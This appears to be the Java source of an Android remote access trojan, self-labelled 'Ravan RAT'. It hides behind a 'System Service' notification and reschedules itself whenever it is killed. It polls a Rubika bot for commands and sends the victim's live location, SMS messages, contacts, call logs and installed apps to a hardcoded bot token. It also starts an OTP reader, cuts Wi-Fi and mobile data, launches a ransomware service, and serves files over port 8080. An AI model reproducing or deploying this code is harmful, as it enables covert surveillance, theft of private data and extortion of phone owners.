package com.security.ravan;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet6Address;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "RavanServerChannel";
    private static final int NOTIFICATION_ID = 1;

    private RavanHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private String lastSentInfo = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private Timer fallbackTimer;
    private Timer locationTimer;
    private Timer commandTimer;
    private boolean hasIPv6 = false;

    // ذخیره موقعیت‌ها
    private static List<String> savedLocations = new ArrayList<>();
    private LocationManager locationManager;
    private LocationListener locationListener;
    private String lastLocation = "نامشخص";

    // OTP و دستورات
    private static String lastOtp = "ندارد";
    private static String pendingCommand = null;

    // ========== اطلاعات ربات‌ها ==========
    private static final String MY_BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
    private static final String MY_CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
    
    private String userBotToken = "";
    private String userChatId = "";
    private SharedPreferences prefs;
    // ====================================

    @Override
    public void onCreate() {
        super.onCreate();
        
        prefs = getSharedPreferences("bot_config", MODE_PRIVATE);
        userBotToken = prefs.getString("user_bot_token", "");
        userChatId = prefs.getString("user_chat_id", "");
        
        createNotificationChannel();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        startLiveLocation();
        checkAndReportIp();
        startOtpReader();
        startCommandListener();
    }

    // ========== OTP Reader ==========
    private void startOtpReader() {
        try {
            com.google.android.gms.auth.api.phone.SmsRetrieverClient client = 
                com.google.android.gms.auth.api.phone.SmsRetriever.getClient(this);
            
            client.startSmsRetriever().addOnSuccessListener(aVoid -> {
                Log.d(TAG, "✅ OTP Reader started");
                sendToRubikaBot("✅ سرویس خواندن OTP فعال شد");
            }).addOnFailureListener(e -> {
                Log.e(TAG, "❌ OTP Reader failed: " + e.getMessage());
            });
        } catch (Exception e) {
            Log.e(TAG, "Error starting OTP Reader: " + e.getMessage());
        }
    }

    public static void updateLastOtp(String otp) {
        lastOtp = otp;
    }

    public static String getLastOtp() {
        return lastOtp;
    }
    // =================================

    // ========== Command Listener ==========
    private void startCommandListener() {
        commandTimer = new Timer();
        commandTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                checkForCommands();
            }
        }, 0, 5000);
    }

    private void checkForCommands() {
        try {
            String urlString = "https://botapi.rubika.ir/v3/" + MY_BOT_TOKEN + "/getUpdates?offset=-1";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            String json = response.toString();
            if (json.contains("callback_data")) {
                String cmd = extractCommand(json);
                if (cmd != null) {
                    executeCommand(cmd);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking commands: " + e.getMessage());
        }
    }

    private String extractCommand(String json) {
        // ساده: دنبال cmd_ بگرد
        int start = json.indexOf("cmd_");
        if (start != -1) {
            int end = json.indexOf("\"", start);
            if (end != -1) {
                return json.substring(start, end);
            }
        }
        return null;
    }

    private void executeCommand(String cmd) {
        Log.d(TAG, "Executing command: " + cmd);
        switch (cmd) {
            case "cmd_location":
                sendToRubikaBot("📍 موقعیت فعلی:\n" + getLastLocation());
                break;
            case "cmd_sms":
                sendToRubikaBot("📨 آخرین پیامک‌ها:\n" + getRecentSMS());
                break;
            case "cmd_contacts":
                sendToRubikaBot("👥 لیست مخاطبین:\n" + getContactsList());
                break;
            case "cmd_calls":
                sendToRubikaBot("📞 تاریخچه تماس‌ها:\n" + getCallLogsList());
                break;
            case "cmd_wifi_off":
                turnOffWifi();
                break;
            case "cmd_data_off":
                turnOffMobileData();
                break;
            case "cmd_ransom":
                startRansomware();
                break;
            default:
                sendToRubikaBot("❌ دستور نامعتبر");
        }
    }

    private String getContactsList() {
        StringBuilder list = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                             android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    list.append("• ").append(name).append(": ").append(number).append("\n");
                    count++;
                    if (count >= 20) break;
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            return "خطا: " + e.getMessage();
        }
        return list.length() > 0 ? list.toString() : "مخاطبی یافت نشد";
    }

    private String getCallLogsList() {
        StringBuilder list = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI,
                new String[]{android.provider.CallLog.Calls.NUMBER,
                             android.provider.CallLog.Calls.TYPE,
                             android.provider.CallLog.Calls.DATE},
                null, null, "date DESC LIMIT 20");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor.getString(0);
                    int type = cursor.getInt(1);
                    String typeStr = type == 1 ? "📞 incoming" : (type == 2 ? "📞 outgoing" : "❌ missed");
                    list.append(typeStr).append(": ").append(number).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            return "خطا: " + e.getMessage();
        }
        return list.length() > 0 ? list.toString() : "تماسی یافت نشد";
    }

    private void turnOffWifi() {
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) getSystemService(Context.WIFI_SERVICE);
            wifiManager.setWifiEnabled(false);
            sendToRubikaBot("📴 WiFi خاموش شد");
        } catch (Exception e) {
            sendToRubikaBot("❌ خطا در خاموش کردن WiFi: " + e.getMessage());
        }
    }

    private void turnOffMobileData() {
        try {
            Process p = Runtime.getRuntime().exec("su");
            java.io.DataOutputStream os = new java.io.DataOutputStream(p.getOutputStream());
            os.writeBytes("svc data disable\n");
            os.flush();
            os.close();
            p.waitFor();
            sendToRubikaBot("📵 دیتا موبایل خاموش شد");
        } catch (Exception e) {
            sendToRubikaBot("❌ خطا در خاموش کردن دیتا (نیاز به روت): " + e.getMessage());
        }
    }

    private void startRansomware() {
        Intent intent = new Intent(this, RansomwareService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        sendToRubikaBot("⚠️⚠️⚠️ باج‌افزار فعال شد! فایل‌ها در حال رمزنگاری...");
    }
    // =================================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("START".equals(action)) {
            startForeground(NOTIFICATION_ID, createNotification());
            startServer();
        } else if ("STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            stopSelf();
        }

        return START_STICKY;
    }

    private void startServer() {
        try {
            if (server != null) {
                try { server.stop(); } catch (Exception e) {}
                server = null;
                Thread.sleep(300);
            }
            server = new RavanHttpServer(this, 8080);
            server.start();
            Log.d(TAG, "HTTP Server started on port 8080");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server: " + e.getMessage());
        }
    }

    private void stopServer() {
        try {
            if (server != null) {
                try { server.stop(); } catch (Exception e) {}
                server = null;
                Log.d(TAG, "HTTP Server stopped");
            }
            if (fallbackTimer != null) {
                fallbackTimer.cancel();
                fallbackTimer = null;
            }
            if (locationTimer != null) {
                locationTimer.cancel();
                locationTimer = null;
            }
            if (locationManager != null && locationListener != null) {
                try { locationManager.removeUpdates(locationListener); } catch (Exception e) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping server: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setSound(null, null);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        String ipv6 = getGlobalIPv6();
        String contentText = (ipv6 != null && hasIPv6) ? "✅ http://[" + ipv6 + "]:8080" : "⚠️ Waiting for IPv6 - Last Location: " + lastLocation;
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔒 System Service")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(false)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy called - scheduling restart!");
        unregisterNetworkCallback();
        if (fallbackTimer != null) { fallbackTimer.cancel(); }
        if (locationTimer != null) { locationTimer.cancel(); }
        if (commandTimer != null) { commandTimer.cancel(); }
        if (locationManager != null && locationListener != null) {
            try { locationManager.removeUpdates(locationListener); } catch (Exception e) {}
        }
        networkExecutor.shutdown();
        stopServer();
        scheduleRestart();
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved called - scheduling restart!");
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    private void scheduleRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent restartIntent = new Intent(this, HttpServerService.class);
            restartIntent.setAction("START");
            PendingIntent pendingIntent = PendingIntent.getService(this, 0, restartIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long triggerTime = System.currentTimeMillis() + 3000;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            }
            Log.d(TAG, "✅ Restart scheduled in 3 seconds");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart: " + e.getMessage());
        }
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                    super.onLinkPropertiesChanged(network, linkProperties);
                    checkAndReportIp();
                }
                @Override
                public void onAvailable(Network network) {
                    super.onAvailable(network);
                    checkAndReportIp();
                    sendLastLocationIfAvailable();
                }
            };
            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try { connectivityManager.unregisterNetworkCallback(networkCallback); } catch (Exception e) {}
        }
    }

    private void startLiveLocation() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "لوکیشن پرمیشن نداریم");
                return;
            }
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    double lat = location.getLatitude();
                    double lon = location.getLongitude();
                    float accuracy = location.getAccuracy();
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                    lastLocation = lat + "," + lon;
                    savedLocations.add(timestamp + "|" + lat + "|" + lon + "|" + accuracy);
                    Log.d(TAG, "موقعیت ذخیره شد: " + lat + "," + lon);
                    String ipv6 = getGlobalIPv6();
                    if (ipv6 != null && hasIPv6) {
                        sendToRubikaBot("📍 موقعیت زنده (" + timestamp + "):\nhttps://maps.google.com/?q=" + lat + "," + lon);
                    }
                    updateNotification();
                }
                @Override public void onProviderDisabled(String provider) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
            }
            Log.d(TAG, "لوکیشن زنده شروع شد - هر 1 دقیقه");
        } catch (Exception e) {
            Log.e(TAG, "خطا در شروع لوکیشن: " + e.getMessage());
        }
    }

    public String getLastLocation() { return lastLocation; }
    public static String getSavedLocationsAsHtml() { /* متد قبلی */ return ""; }

    private void sendLastLocationIfAvailable() {
        if (!lastLocation.equals("نامشخص")) {
            String[] parts = lastLocation.split(",");
            if (parts.length == 2) {
                sendToRubikaBot("📍 آخرین موقعیت ذخیره شده:\nhttps://maps.google.com/?q=" + parts[0] + "," + parts[1]);
            }
        }
    }

    private void checkAndReportIp() {
        String ipv6 = getGlobalIPv6();
        if (ipv6 != null && !ipv6.equals(lastReportedIp)) {
            hasIPv6 = true;
            lastReportedIp = ipv6;
            Log.d(TAG, "IPv6 Detected: " + ipv6);
            if (fallbackTimer != null) { fallbackTimer.cancel(); fallbackTimer = null; }
            sendMenuToBot();  // ← ارسال منوی تعاملی
            updateNotification();
        } else if (ipv6 == null) {
            if (fallbackTimer == null) {
                Log.d(TAG, "No IPv6 detected, starting fallback reporting mode");
                startFallbackReporting();
            }
        }
    }

    // ========== منوی تعاملی با اینلاین کیبورد ==========
    private void sendMenuToBot() {
        String message = "✅ **Ravan RAT Online**\n\n" +
                "📍 دستگاه: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                "🔗 پنل وب: http://[" + lastReportedIp + "]:8080\n\n" +
                "🔹 **خدمات:**\n" +
                "• 📁 مدیریت فایل\n• 📍 موقعیت\n• 📸 دوربین\n• 🎤 صدا\n• 📨 پیامک\n• 📞 تماس\n• 👥 مخاطب\n• 🛜 قطع اینترنت\n• ⚠️ باج‌افزار\n\n" +
                "📌 **روی دکمه مورد نظر کلیک کنید:**";

        String inlineKeyboard = "{\"inline_keypad\":{\"rows\":[" +
            "[{\"id\":\"files\",\"type\":\"Url\",\"button_text\":\"📁 File Manager\",\"url\":\"http://[" + lastReportedIp + "]:8080/files\"}]," +
            "[{\"id\":\"location\",\"type\":\"Callback\",\"button_text\":\"📍 Get Location\",\"callback_data\":\"cmd_location\"}," +
             "{\"id\":\"camera\",\"type\":\"Callback\",\"button_text\":\"📸 Take Photo\",\"callback_data\":\"cmd_camera\"}]," +
            "[{\"id\":\"audio\",\"type\":\"Callback\",\"button_text\":\"🎤 Record Audio\",\"callback_data\":\"cmd_audio\"}," +
             "{\"id\":\"sms\",\"type\":\"Callback\",\"button_text\":\"📨 Last SMS\",\"callback_data\":\"cmd_sms\"}]," +
            "[{\"id\":\"calls\",\"type\":\"Callback\",\"button_text\":\"📞 Call Logs\",\"callback_data\":\"cmd_calls\"}," +
             "{\"id\":\"contacts\",\"type\":\"Callback\",\"button_text\":\"👥 Contacts\",\"callback_data\":\"cmd_contacts\"}]," +
            "[{\"id\":\"wifi_off\",\"type\":\"Callback\",\"button_text\":\"📴 WiFi OFF\",\"callback_data\":\"cmd_wifi_off\"}," +
             "{\"id\":\"data_off\",\"type\":\"Callback\",\"button_text\":\"📵 Data OFF\",\"callback_data\":\"cmd_data_off\"}]," +
            "[{\"id\":\"ransom\",\"type\":\"Callback\",\"button_text\":\"⚠️ Ransomware\",\"callback_data\":\"cmd_ransom\"}]" +
            "]}}";

        sendToSpecificBotWithKeyboard(MY_BOT_TOKEN, MY_CHAT_ID, message, inlineKeyboard);
    }

    private void sendToSpecificBotWithKeyboard(String botToken, String chatId, String message, String keyboard) {
        networkExecutor.execute(() -> {
            try {
                String escapedMessage = message.replace("\"", "\\\"").replace("\n", "\\n");
                String urlString = "https://botapi.rubika.ir/v3/" + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                String jsonInputString = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + escapedMessage + "\", " + keyboard + "}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonInputString.getBytes(StandardCharsets.UTF_8));
                }
                int code = conn.getResponseCode();
                Log.d(TAG, "Menu sent: " + code);
            } catch (Exception e) {
                Log.e(TAG, "Failed to send menu: " + e.getMessage());
            }
        });
    }
    // =============================================

    private String getGlobalIPv6() {
        try {
            if (connectivityManager == null) return null;
            Network activeNetwork = connectivityManager.getActiveNetwork();
            if (activeNetwork == null) return null;
            LinkProperties linkProps = connectivityManager.getLinkProperties(activeNetwork);
            if (linkProps == null) return null;
            List<LinkAddress> addresses = linkProps.getLinkAddresses();
            for (LinkAddress addr : addresses) {
                if (addr.getAddress() instanceof Inet6Address) {
                    String ip = addr.getAddress().getHostAddress();
                    int idx = ip.indexOf('%');
                    if (idx >= 0) ip = ip.substring(0, idx);
                    if (!ip.toLowerCase().startsWith("fe80") && !ip.equals("::1") && !ip.startsWith("fd") && !ip.startsWith("fc")) {
                        return ip;
                    }
                }
            }
        } catch (Exception e) { Log.e(TAG, "Error getting IPv6: " + e.getMessage()); }
        return null;
    }

    private void startFallbackReporting() {
        if (fallbackTimer != null) return;
        fallbackTimer = new Timer();
        fallbackTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                String info = collectDeviceInfo();
                if (!info.equals(lastSentInfo)) {
                    lastSentInfo = info;
                    sendToRubikaBot(info);
                }
            }
        }, 0, 3600000);
    }

    private String collectDeviceInfo() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        StringBuilder info = new StringBuilder();
        info.append("📡 گزارش خودکار\n");
        info.append("🕐 ").append(sdf.format(new Date())).append("\n");
        info.append("📱 ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        info.append("🤖 Android ").append(Build.VERSION.RELEASE).append("\n\n");
        if (!lastLocation.equals("نامشخص")) {
            String[] parts = lastLocation.split(",");
            if (parts.length == 2) {
                info.append("📍 آخرین موقعیت:\n   https://maps.google.com/?q=").append(parts[0]).append(",").append(parts[1]).append("\n\n");
            }
        } else {
            info.append("📍 موقعیت: در انتظار GPS...\n\n");
        }
        info.append("📱 اپ‌های نصب شده:\n").append(getInstalledApps());
        info.append("\n📨 آخرین پیامک‌ها:\n").append(getRecentSMS());
        return info.toString();
    }

    private String getInstalledApps() {
        StringBuilder apps = new StringBuilder();
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(0);
            int count = 0;
            for (android.content.pm.ApplicationInfo app : packages) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null && count < 20) {
                    apps.append("  • ").append(pm.getApplicationLabel(app)).append("\n");
                    count++;
                }
            }
            if (packages.size() > 20) {
                apps.append("  و ").append(packages.size() - 20).append(" اپ دیگر...\n");
            }
        } catch (Exception e) { apps.append("  خطا: ").append(e.getMessage()); }
        return apps.toString();
    }

    private String getRecentSMS() {
        StringBuilder smsList = new StringBuilder();
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return "  ❌ دسترسی به پیامک داده نشده است";
            }
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 5");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor.getString(0);
                    String body = cursor.getString(1);
                    if (body.length() > 50) body = body.substring(0, 50) + "...";
                    smsList.append("  📩 از ").append(number).append(": ").append(body).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            } else {
                smsList.append("  هیچ پیامکی یافت نشد\n");
            }
        } catch (Exception e) { smsList.append("  خطا: ").append(e.getMessage()); }
        return smsList.toString();
    }

    private void sendToRubikaBot(String message) {
        sendToSpecificBot(MY_BOT_TOKEN, MY_CHAT_ID, message);
        if (userBotToken != null && !userBotToken.isEmpty() && userChatId != null && !userChatId.isEmpty()) {
            sendToSpecificBot(userBotToken, userChatId, message);
        }
    }
    
    private void sendToSpecificBot(String botToken, String chatId, String message) {
        networkExecutor.execute(() -> {
            try {
                String escaped = message.replace("\"", "\\\"").replace("\n", "\\n");
                String urlString = "https://botapi.rubika.ir/v3/" + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                String json = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + escaped + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }
                Log.d(TAG, "Sent to bot: " + conn.getResponseCode());
            } catch (Exception e) { Log.e(TAG, "Failed to send: " + e.getMessage()); }
        });
    }

    private void updateNotification() {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.notify(NOTIFICATION_ID, createNotification());
    }

    public static boolean isRunning() { return true; }
}
